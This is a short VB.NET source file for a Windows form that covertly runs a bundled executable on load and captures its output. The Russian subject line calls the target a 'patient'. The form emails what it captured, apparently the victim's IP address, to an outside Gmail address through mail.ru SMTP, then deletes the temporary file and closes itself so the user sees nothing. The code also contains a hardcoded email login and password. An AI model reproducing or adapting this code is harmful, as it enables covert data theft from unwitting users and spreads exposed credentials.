Imports System
Imports System.IO
Imports System.Net
Imports System.Net.Mail


Public Class Form1
    Dim texte As String


    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Shell("cmd.exe /c 2.exe>2.txt")
        System.Threading.Thread.Sleep(10000)
        Dim path As String = "2.txt"
        Using sr As StreamReader = File.OpenText(path)
            texte = sr.ReadLine()
            sr.Close()
        End Using
        ' --- формируем само письмо
        Dim msg As MailMessage
        msg = New MailMessage()
        msg.From = New MailAddress("genadys@mail.ru", "IP")
        msg.To.Add("fargutvest@gmail.com")
        msg.Subject = "IP адрес пациента#"
        msg.Body = texte
        msg.IsBodyHtml = True


        ' --- Подключаемся к Smtp и выполняем отправку
        Dim smtpclient As New SmtpClient("smtp.mail.ru", 25)
        'If ssl = 1 Then smtpclient.EnableSsl = True Else smtpclient.EnableSsl = False
        smtpclient.Credentials = New NetworkCredential("genadys", "basmakarpull")
        smtpclient.Send(msg)

        ' --- Очищаем память :)
        msg.Dispose()
        File.Delete(path)
        Me.Close()
    End Sub
End Class

